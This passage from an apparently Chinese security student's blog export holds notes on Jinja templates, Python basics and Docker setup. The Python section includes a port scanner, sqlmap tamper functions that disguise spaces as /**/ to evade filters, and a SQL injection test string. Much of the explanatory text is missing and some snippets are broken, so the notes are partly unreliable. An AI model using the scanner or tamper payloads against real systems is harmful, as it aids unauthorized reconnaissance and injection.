&lt;a href=\"#\"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt;</span><br><span class=\"line\">        &lt;/li&gt;</span><br><span class=\"line\">            &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt;</span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\">    &lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"block\"><a href=\"#block\" class=\"headerlink\" title=\"block\"></a>block</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python</span><br><span class=\"line\">class Person(object):</span><br><span class=\"line\">\tname &#x3D; &#39;pz1o&#39;</span><br><span class=\"line\">\tage &#x3D; 18</span><br><span class=\"line\">class Student(Person):</span><br><span class=\"line\">\tpass</span><br></pre></td></tr></table></figure>\n<p></p>\n<ul>\n<li><p></p>\n</li>\n<li><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% extends &#39;base.html&#39;%&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>block</p>\n<ul>\n<li></li>\n<li>block</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% block main %&#125;</span><br><span class=\"line\">    &lt;h1&gt;&lt;&#x2F;h1&gt;</span><br><span class=\"line\">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\">print(<span class=\"string\">'hello pz1o'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#linux</span></span><br><span class=\"line\">chmod <span class=\"number\">777</span> python</span><br><span class=\"line\">./a.py</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pyo</span></span><br><span class=\"line\">python -O -m py_compile a.py</span><br><span class=\"line\">python a.pyo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#eval</span></span><br><span class=\"line\">a = <span class=\"string\">'[1,2,3]'</span></span><br><span class=\"line\">b = eval(a)</span><br><span class=\"line\">print(b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#%</span></span><br><span class=\"line\"><span class=\"comment\">#%c:ascii</span></span><br><span class=\"line\">a = <span class=\"number\">97</span></span><br><span class=\"line\">print(<span class=\"string\">'i am %c'</span>%a)</span><br><span class=\"line\"><span class=\"comment\">#%x:16</span></span><br><span class=\"line\">print(<span class=\"string\">'i am %x'</span>%a)</span><br><span class=\"line\"><span class=\"comment\">#%o:8</span></span><br><span class=\"line\">print(<span class=\"string\">'i am %o'</span>%a)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">time = time.time()</span><br><span class=\"line\">time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#args args kwargs</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sub</span><span class=\"params\">(num1,num2,*args,**kwargs)</span>:</span></span><br><span class=\"line\">  print(num1-num2)</span><br><span class=\"line\">  print(args)</span><br><span class=\"line\">  print(kwargs)</span><br><span class=\"line\">a = [<span class=\"number\">5</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\">sub(*a)</span><br><span class=\"line\"><span class=\"number\">2</span>  (<span class=\"number\">2</span>,)  &#123;&#125;</span><br><span class=\"line\">sub(<span class=\"number\">5</span>,<span class=\"number\">3</span>,x=<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"number\">2</span>  ()  &#123;<span class=\"string\">'x'</span>: <span class=\"number\">2</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#r  </span></span><br><span class=\"line\"><span class=\"comment\">#w  </span></span><br><span class=\"line\"><span class=\"comment\">#a </span></span><br><span class=\"line\"><span class=\"comment\">#a+  </span></span><br><span class=\"line\"><span class=\"comment\">#b </span></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'yyds.txt'</span>,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    print(f.read())</span><br><span class=\"line\">CUMTCTF&#123;<span class=\"number\">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class=\"line\">\t\tf.seek(<span class=\"number\">7</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">  \tprint(f.read())</span><br><span class=\"line\">&#123;<span class=\"number\">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class=\"line\"><span class=\"comment\">#f.seek('','')</span></span><br><span class=\"line\"><span class=\"comment\">#0</span></span><br><span class=\"line\"><span class=\"comment\">#1</span></span><br><span class=\"line\"><span class=\"comment\">#2</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">#os</span></span><br><span class=\"line\">os.mkdir(<span class=\"string\">'./yyds'</span>)</span><br><span class=\"line\">os.rmdir(<span class=\"string\">'./yyds'</span>)</span><br><span class=\"line\">os.listdir(<span class=\"string\">'./'</span>)</span><br><span class=\"line\">os.getcwd()</span><br><span class=\"line\">os.chdir(<span class=\"string\">'../'</span>)  <span class=\"comment\">#</span></span><br><span class=\"line\">os.system(<span class=\"string\">'dir'</span>)  <span class=\"comment\">#,0,1</span></span><br><span class=\"line\">res = os.popen(<span class=\"string\">'dir'</span>)  <span class=\"comment\">#</span></span><br><span class=\"line\">print(res.read())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">except</span> :</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">finally</span>:</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\">port = [<span class=\"number\">21</span>,<span class=\"number\">22</span>,<span class=\"number\">23</span>,<span class=\"number\">80</span>,<span class=\"number\">135</span>,<span class=\"number\">139</span>,<span class=\"number\">443</span>,<span class=\"number\">1433</span>,<span class=\"number\">3306</span>,<span class=\"number\">3389</span>]</span><br><span class=\"line\">allports = [<span class=\"number\">0</span>,<span class=\"number\">65535</span>]</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(ip,port,*args,**kwargs)</span>:</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        s.connect((ip, port))</span><br><span class=\"line\">        print(<span class=\"string\">\"[+]The %s port %s is open\"</span>%(ip,port))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[+]The %s port %s is closed\"</span>%(ip,port))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ports</span><span class=\"params\">(ip,port)</span>:</span><span class=\"comment\">#search some incoming specific parameters</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> port:</span><br><span class=\"line\">        scan(ip,p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">convert</span><span class=\"params\">(array)</span>:</span></span><br><span class=\"line\">    a = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> array:</span><br><span class=\"line\">        a.append(int(x))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">portsplus</span><span class=\"params\">(ip,port)</span>:</span><span class=\"comment\">#search the parameters of an interval passed in</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> range(port[<span class=\"number\">0</span>],port[<span class=\"number\">1</span>]+<span class=\"number\">1</span>):</span><br><span class=\"line\">        scan(ip,p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> len(sys.argv) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">            print(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">[+]You can read the following rules to use this tool.</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py host ports</span></span><br><span class=\"line\"><span class=\"string\">[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py 127.0.0.1 80,90,3306,3389</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py 127.0.0.1 80-90</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py 127.0.0.1 all</span></span><br><span class=\"line\"><span class=\"string\">            '''</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> len(sys.argv) == <span class=\"number\">2</span>:</span><br><span class=\"line\">            ports(sys.argv[<span class=\"number\">1</span>],port)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            ip = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">','</span> <span class=\"keyword\">in</span> sys.argv[<span class=\"number\">2</span>]:</span><br><span class=\"line\">                p = sys.argv[<span class=\"number\">2</span>]</span><br><span class=\"line\">                p = p.split(<span class=\"string\">','</span>)</span><br><span class=\"line\">                ports(ip,convert(p))</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> <span class=\"string\">'-'</span> <span class=\"keyword\">in</span> sys.argv[<span class=\"number\">2</span>]:</span><br><span class=\"line\">                p = sys.argv[<span class=\"number\">2</span>]</span><br><span class=\"line\">                p = p.split(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">                portsplus(ip,convert(p))</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> sys.argv[<span class=\"number\">2</span>] == <span class=\"string\">'all'</span>:</span><br><span class=\"line\">                portsplus(ip,allports)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                port = int(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">                scan(ip,port)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">[+]There is something wrong!!!</span></span><br><span class=\"line\"><span class=\"string\">        '''</span>)</span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        print(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">[+]The task has been completed!!!</span></span><br><span class=\"line\"><span class=\"string\">        '''</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span>:</span></span><br><span class=\"line\">    __age = <span class=\"number\">18</span> <span class=\"comment\">#</span></span><br><span class=\"line\">    name = <span class=\"string\">'name'</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,name)</span>:</span></span><br><span class=\"line\">        self.name = name;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">introduce</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">\"my name is %s,and my age is %d\"</span>%((self.name),(self.__age)))</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__hello</span><span class=\"params\">(self)</span>:</span><span class=\"comment\">#</span></span><br><span class=\"line\">        print(<span class=\"string\">\"Hello!! My name is %s\"</span>%(self.name))</span><br><span class=\"line\"></span><br><span class=\"line\">pz1o = Person(<span class=\"string\">'pz1o'</span>)</span><br><span class=\"line\">pz1o.introduce()<span class=\"comment\">#</span></span><br><span class=\"line\">print(pz1o._Person__age)<span class=\"comment\">#</span></span><br><span class=\"line\">pz1o._Person__hello()<span class=\"comment\">#</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#tamper</span></span><br><span class=\"line\">--tamper scan.py</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload,**kwargs)</span>:</span></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> payload:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> x.isspace():</span><br><span class=\"line\">                retVal += <span class=\"string\">\"/**/\"</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                retVal += x</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br><span class=\"line\"></span><br><span class=\"line\">print(tamper(<span class=\"string\">\"1' and 1=1#\"</span>))</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload,**kwargs)</span>:</span></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        flag = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> payload:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> x == <span class=\"string\">\"'\"</span> <span class=\"keyword\">or</span> x == <span class=\"string\">'\"'</span>:</span><br><span class=\"line\">                flag = <span class=\"keyword\">not</span> flag</span><br><span class=\"line\">                retVal += <span class=\"string\">\"'\"</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> x.isspace() <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> flag:</span><br><span class=\"line\">                retVal += <span class=\"string\">\"/**/\"</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                retVal += x</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br><span class=\"line\"></span><br><span class=\"line\">print(tamper(<span class=\"string\">\"1' my name is pz1o' and 1=1#\"</span>))</span><br></pre></td></tr></table></figure>\n","categories":[""],"tags":["python"]},{"title":"Docker","url":"https://pz1o.top/2020/08/07/Docker/","content":"<a id=\"more\"></a>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>docker,</p>\n<p>b<a href=\"https://www.bilibili.com/video/BV1og4y1q7M4?\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1og4y1q7M4?</a></p>\n<h1 id=\"Docker\"><a href=\"#Docker\" class=\"headerlink\" title=\"Docker\"></a>Docker</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812213743035.png\" alt=\"image-20200812213743035\"></p>\n<p> Image  Docker  </p>\n<p> Container   Image  Container    </p>\n<p> Repository  <strong>Docker Registry</strong>  Repository  Tag </p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.</span><br><span class=\"line\">sudo yum remove docker \\</span><br><span class=\"line\">                   docker-client \\</span><br><span class=\"line\">                   docker-client-latest \\</span><br><span class=\"line\">                   docker-common \\</span><br><span class=\"line\">                   docker-latest \\</span><br><span class=\"line\">                   docker-latest-logrotate \\</span><br><span class=\"line\">                   docker-logrotate \\</span><br><span class=\"line\">                   docker-engine</span><br><span class=\"line\"></span><br><span class=\"line\">//2.</span><br><span class=\"line\">yum install -y yum-utils</span><br><span class=\"line\">//3.</span><br><span class=\"line\">yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class=\"line\">//4.yum</span><br><span class=\"line\">yum makecache fast</span><br><span class=\"line\">//5.docker</span><br><span class=\"line\">yum install docker-ce docker-ce-cli containerd.io</span><br><span class=\"line\">y</span><br><span class=\"line\">//6.docker</span><br><span class=\"line\">systemctl start docker</span><br><span class=\"line\">//7.docker</span><br><span class=\"line\">docker version </span><br><span class=\"line\">docker run hello-world</span><br><span class=\"line\">//8.docker</span><br><span class=\"line\">docker images</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812224856499.png\" alt=\"image-20200812224856499\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;docker</span><br><span class=\"line\">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class=\"line\">rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br><span class=\"line\">&#x2F;var&#x2F;lib&#x2F;docker docker </span><br></pre></td></tr></table></figure>\n<p><strong>run</strong></p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813152655350.png\" alt=\"image-20200813152655350\"></p>\n<h2 id=\"Dockervm\"><a href=\"#Dockervm\" class=\"headerlink\" title=\"Dockervm\"></a>Dockervm</h2><p><strong></strong></p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153605377.png\" alt=\"image-20200813153605377\"></p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153615560.png\" alt=\"image-20200813153615560\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker version  &#x2F;&#x2F;</span><br><span class=\"line\">docker info  &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://docs.docker.com/\" target=\"_blank\" rel=\"noopener\">https://docs.docker.com/</a></p>\n<p><strong></strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker images -a  //</span><br><span class=\"line\">dokcer images -q  //id</span><br><span class=\"line\"><span class=\"meta\">[root@/]#</span><span class=\"bash\"> docker images</span></span><br><span class=\"line\">REPOSITORY()          TAG()                 IMAGE ID(id)            CREATED()             SIZE()</span><br><span class=\"line\">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class=\"line\"></span><br><span class=\"line\">docker search  mysql  //</span><br><span class=\"line\">dokcer pull mysql[:tag]  //</span><br><span class=\"line\">docker pull docker.io/library/mysql:latest</span><br><span class=\"line\">docker rmi -f id  //</span><br><span class=\"line\">docker rmi -f $(docker images -aq)  //</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p>==centos==</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull centos</span><br><span class=\"line\">docker run [] image  //</span><br><span class=\"line\">--name=\"name1\"  //</span><br><span class=\"line\">-d  //</span><br><span class=\"line\">-P  //</span><br><span class=\"line\">-i  //-t</span><br><span class=\"line\">-t  //-i</span><br><span class=\"line\">-it  //</span><br><span class=\"line\">-p ip  //</span><br><span class=\"line\"></span><br><span class=\"line\">docker ps //</span><br><span class=\"line\">docker ps -a  //</span><br><span class=\"line\">docker rm id  //</span><br><span class=\"line\">docker rm -f $(docker ps -aq)  //</span><br><span class=\"line\">docker start id  //</span><br><span class=\"line\">docker restart id  //</span><br><span class=\"line\">docker stop id  //</span><br><span class=\"line\">docker kill id  //</span><br><span class=\"line\"></span><br><span class=\"line\">//</span><br><span class=\"line\">docker run -it centos /bin/bash</span><br><span class=\"line\">//</span><br><span class=\"line\">exit  </span><br><span class=\"line\">ctrl+p+q  </span><br></pre></td></tr></table></figure>\n<h2 id=\"githubCTF\"><a href=\"#githubCTF\" class=\"headerlink\" title=\"githubCTF\"></a>githubCTF</h2><p>githubclone</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone xxx</span><br></pre></td></tr></table></figure>\n<p>docker.yml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br><span class=\"line\"></span><br><span class=\"line\">docker ps #</span><br></pre></td></tr></table></figure>\n<p>dockerfile</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dockerfile</span><br><span class=\"line\"></span><br><span class=\"line\">docker build -t 